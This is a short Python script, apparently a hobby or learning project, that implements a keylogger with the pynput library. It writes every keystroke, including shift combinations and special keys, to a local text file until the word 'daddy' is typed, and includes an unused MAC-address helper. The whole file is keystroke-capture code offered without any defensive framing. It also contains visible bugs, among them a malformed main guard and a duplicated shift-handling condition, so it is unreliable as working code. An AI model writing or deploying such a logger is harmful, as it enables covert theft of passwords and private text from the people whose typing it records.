from pynput import keyboard
import uuid
# Define the sequence to stop the keylogger (case-sensitive)
stop_sequence = "daddy"
current_sequence = ""

# Track Shift key state
shift_pressed = False
def get_mac_address():
    print("Getting MAC address...")
    mac = uuid.UUID(int=uuid.getnode()).hex[-12:]
    return ":".join([mac[e:e+2] for e in range(0, 11, 2)])

def on_press(key):
    global current_sequence, shift_pressed
    
    try:
        # Handle Shift key state
        if key == keyboard.Key.shift or key == keyboard.Key.shift_r:
            shift_pressed = True
        elif key == keyboard.Key.shift or key == keyboard.Key.shift_r:
            shift_pressed = False
        
        # Handle regular character keys
        if hasattr(key, 'char') and key.char is not None:
            char = key.char
            # Append Shift indication if Shift is pressed
            if shift_pressed:
                char = f"[SHIFT+{char.upper()}]"
            else:
                char = char.lower()
            
            # Append character to current sequence and check stop condition
            current_sequence += char
            if current_sequence[-len(stop_sequence):] == stop_sequence:
                print(f"'{stop_sequence}' detected. Stopping keylogger.")
                return False  # Stops the listener
            
            # Write the character to the file
            with open("keyfile1.txt", 'a') as logKey:
                logKey.write(char)
                logKey.flush()  # Ensure data is written to disk immediately
        
        # Handle space key
        elif key == keyboard.Key.space:
            current_sequence += ' '
            with open("keyfile1.txt", 'a') as logKey:
                logKey.write(' ')
                logKey.flush()  # Ensure data is written to disk immediately
        
        # Handle other special keys
        else:
            special_key = str(key).replace("Key.", "")
            if special_key:  # Avoid empty strings
                with open("keyfile1.txt", 'a') as logKey:
                    logKey.write(f"[{special_key}]")
                    logKey.flush()  # Ensure data is written to disk immediately

    except Exception as e:
        # Print any exceptions for debugging
        print(f"Error: {e}")

def on_release(key):
    global shift_pressed
    if key == keyboard.Key.shift or key == keyboard.Key.shift_r:
        shift_pressed = False

if _name_ == "_main_":
    listener = keyboard.Listener(on_press=on_press, on_release=on_release)
    listener.start()
    listener.join()  # Keeps the program running until the keylogger is stopped